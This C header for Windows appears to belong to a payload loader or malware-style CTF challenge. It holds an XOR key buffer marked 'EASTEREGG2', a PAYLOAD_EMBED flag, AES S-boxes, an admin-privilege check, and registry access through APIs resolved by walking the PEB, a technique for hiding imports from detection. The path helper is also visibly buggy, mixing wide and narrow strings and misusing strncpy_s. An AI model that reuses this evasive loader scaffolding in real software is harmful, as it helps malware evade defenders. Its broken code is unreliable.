#pragma once 
#include <Windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include "peb-lookup.h"
#include "func-prototype.h"


//int BUFFER_Size = 203602;
 //int BUFFER_Size = 205;

unsigned char keybuffer[] = "___EASTEREGG2___""\xca\xfe\xba\xbe\xde\xad\xc0\xde";
int KEY_Size = 8;

#define DEBUG 1
#define PAYLOAD_EMBED 

void _xor(unsigned char *dest, unsigned char * src, int len)
{
    for(int i =0 ; i< len; ++i)
    {
        dest[i] ^= src[i];
    }
}
unsigned char inv_sbox[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
};

unsigned char sbox[256] = {
 /* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

#define ROTBYTE(opcode,k) ((opcode << (8 - k)) | (opcode >> k))

void PrintLastError(DWORD errorNum) 
{
    if (errorNum == 0) {
        return; // No error message has been recorded
    }

    LPSTR messageBuffer = NULL;
    size_t size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    printf("Error code %lu: %s\n", errorNum, messageBuffer);

    // Free the buffer allocated by FormatMessage
    LocalFree(messageBuffer);
}


BOOL generate_random_bytes(unsigned char *buffer, size_t length) {
    HCRYPTPROV hCryptProv;

    // Acquire a cryptographic provider context handle
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, 0)) {
        if (GetLastError() == NTE_BAD_KEYSET) {
            if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
                #ifdef DEBUG
                printf("[x] CryptAcquireContext failed: %lu\n", GetLastError());
                DWORD error = GetLastError();
                PrintLastError(error);
                #endif
                return FALSE;
            }
        } else {
            #ifdef DEBUG
            printf("[x] CryptAcquireContext failed: %lu\n", GetLastError());
            DWORD error = GetLastError();
            PrintLastError(error);
            #endif
            return FALSE;
        }
    }

    // Generate random bytes
    if (!CryptGenRandom(hCryptProv, length, buffer)) {
        #ifdef DEBUG
        printf("[x] CryptGenRandom failed: %lu\n", GetLastError());
        DWORD error = GetLastError();
        PrintLastError(error);
        CryptReleaseContext(hCryptProv, 0);
        #endif
        return FALSE;
    }

    // Release the cryptographic provider context handle
    CryptReleaseContext(hCryptProv, 0);
    return TRUE;
}


BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;

    // Allocate and initialize a SID for the Administrators group.
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(
        &ntAuthority, 2, 
        SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 
        0, 0, 0, 0, 0, 0, 
        &adminGroup)) {
        
        // Check whether the SID is enabled in the current process token.
        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    
    return isAdmin;
}

void GetCurrentProcessDirectory(char* processDir, DWORD size) {
    LPWSTR fullPath[MAX_PATH];
    DWORD length = GetModuleFileNameW(NULL, fullPath, MAX_PATH);

    if (length == 0) {
        // perror("GetModuleFileName");
        return;
    }

    // Find the last backslash in the path
    char* lastSlash = strrchr(fullPath, '\\');
    if (lastSlash != NULL) {
        // Null-terminate the string at the last backslash to get the directory
        *lastSlash = '\0';
        strncpy_s(processDir, 1,fullPath, size);
    } else {
        // perror("Failed to find the directory part in the path");
    }
}


BOOL OpenKeyRecursive(HKEY currentKey, PHKEY saveKey, char **subkeys, int currentidx, int endidx)
{
    HMODULE kernel32  = (HMODULE)getModuleByName(aKernel32dll);
    pLoadLibraryA _LoadLibraryA = (pLoadLibraryA) getFuncByName(kernel32, aLoadLibraryA);
    HMODULE advapi32 = _LoadLibraryA(aAdvapi32);
    pRegCloseKey _RegCloseKey = (pRegCloseKey)getFuncByName(advapi32, aRegCloseKey);
    pRegOpenKeyA _RegOpenKeyA = (pRegOpenKeyA)getFuncByName(advapi32, aRegOpenKeyA);
    HKEY hKey ;
    LSTATUS result = _RegOpenKeyA(currentKey, subkeys[currentidx], &hKey);
    if (result == ERROR_SUCCESS)
    {
        #ifdef DEBUG
        printf("--> %d: Opened subkey: %s\n", currentidx, subkeys[currentidx]);
        #endif
        if ( currentidx == endidx) {
            *saveKey = hKey;
            return TRUE;
        }
        else
        {
            BOOL check = OpenKeyRecursive(hKey, saveKey, subkeys, currentidx + 1, endidx);
            if (hKey != HKEY_CURRENT_USER && hKey != HKEY_CURRENT_CONFIG && hKey != HKEY_CLASSES_ROOT && hKey != HKEY_LOCAL_MACHINE && hKey != HKEY_USERS)
                _RegCloseKey(hKey);
            return check;
        }
    }
    else
    {
        #ifdef DEBUG
        printf("--> %d: Failed to open subkey: %s\n", currentidx, subkeys[currentidx]);
        #endif
        return FALSE;
    }
}